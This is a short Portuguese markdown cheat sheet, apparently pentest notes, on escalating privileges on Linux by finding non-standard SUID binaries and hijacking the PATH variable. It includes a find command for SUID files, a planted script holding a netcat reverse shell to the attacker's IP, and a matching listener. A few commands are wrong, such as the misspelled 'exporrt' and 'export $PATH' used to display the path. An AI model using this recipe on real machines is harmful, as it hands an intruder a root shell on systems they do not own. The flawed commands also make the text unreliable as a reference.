## Escalando privilégios por SUID bit


```
find / -perm /4000 2>/dev/null
```
> Procurando na raiz todos os arquivos com uma permissão em especifica (SUID bit ativo), mandando todo erro pro /dev/null
> <br> Procure por arquivos fora das pastas padrão do sistema

<br>

#### Após localizar um arquivo fora do padrão

```
exporrt $PATH			---> Mostra o caminho da variável

export PATH=/			---> Alterando o caminho pra fora do normal
```
> Salve o caminho anterior e altere. <br>
> Isso provavelmente irá causar erros no arquivo fora do padrão;
> <br>Logo após isso tente executar o arquivo fora do padrão e analize o comando que nao foi encontrado.
> <br> Supondo que seja o cp o comando não encontrado (Para os exemplos posteriores).

<br>

#### Criando e executando o comando malicioso

(Exemplo de script):
```
echo "/bin/nc <my_ip><port> -e /bin/bash" > run		---> Reverse shell
chmod +x run
```
> Coloque o Run em um diretório diferente do original da variavel $PATH, por exemplo o /tmp
> <br> Retorne o path original da variavel $PATH e altere o nome do arquivo run para o mesmo do comando que não foi encontrado.
> <br> Mude o path da variavel $PATH para o diretorio em que está o arquivo com o nome alterado.

<br>

```
nc -nlvp <port>							---> Mesma porta do arquivo do reverse shell
```
> Utilize o nc na sua máquina.
> <br> Execute o arquivo fora do padrão que foi encontrado na máquina alvo. 






